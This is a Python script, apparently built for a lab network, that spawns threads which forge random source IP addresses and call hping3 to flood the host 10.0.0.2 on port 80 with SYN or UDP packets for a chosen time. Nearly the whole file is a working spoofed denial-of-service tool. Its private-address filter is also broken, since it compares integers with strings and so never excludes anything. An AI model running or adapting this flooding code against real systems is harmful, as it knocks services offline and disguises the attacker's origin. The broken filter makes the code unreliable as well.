import os 
import sys
import random
import threading
import signal
from random import randrange



class Mythread (threading.Thread):

    def __init__(self, attack_time, attack_type, data_size, ip_number):

        
        super(Mythread, self).__init__()
        self.param = {}
        self.attack_time = attack_time
        self.attack_type = attack_type
        self.data_size   = data_size
        self.ip_number   = ip_number
        self.ip_list     = []

        self.param = {
            'attack_time' : self.attack_time,
            'attack_type' : self.attack_type,
            'data_size'   : self.data_size,
            'ip_number'   : self.ip_number
        }

        self.attack_building(self.param)

    def generation_ip(self, ip_number):


        for rnd in range(ip_number):

            not_valid_ip = ['10', '255', '172', '192', '254', '127']

            first_oct_ip = randrange(1, 256)

            while first_oct_ip in not_valid_ip:

                first_oct_ip = random.randrange(1, 253)

            ip = '.'.join([str(first_oct_ip), str(randrange(1, 254)), str(randrange(1, 254)), str(randrange(1, 254))])

            self.ip_list.append(ip)


        return self.ip_list


        


    def attack_building(self, param):

        self.param['src_addre']  = self.generation_ip(self.param['ip_number'])

        if self.param['data_size'] == '0':

            self.param['data_size'] = random.choice([100, 200, 300, 400, 500, 600, 700, 800])
        else :

            self.param['data_size'] = self.data_size

        # if self.param['attack_type'] == 'ICMP':

        #     self.param['attack_type'] == '-1'

        if self.param['attack_type'] == 'UDP':

            self.param['attack_type'] = '-2'

        if self.param['attack_type'] == 'TCP':

            self.param['attack_type'] = '-S'

        if self.param['attack_type'] == '0':

            self.param['attack_type'] = random.choice(['-2', '-S'])
    

    def run(self):

        for ip_add in self.ip_list:

            os.system('timeout {}s hping3 {} -a {} -V -p 80 -d {} -c 20 10.0.0.2'.format(
                self.param['attack_time'],
                self.param['attack_type'],
                ip_add,
                self.param['data_size']))
            #print('\033[1;92m'+' im thread {} my ip {} \n'.format(threading.get_native_id(), ip_add))
            print('\033[1;33m'+'\n[!]'+ '\033[0m' +' Attack terminated.')


  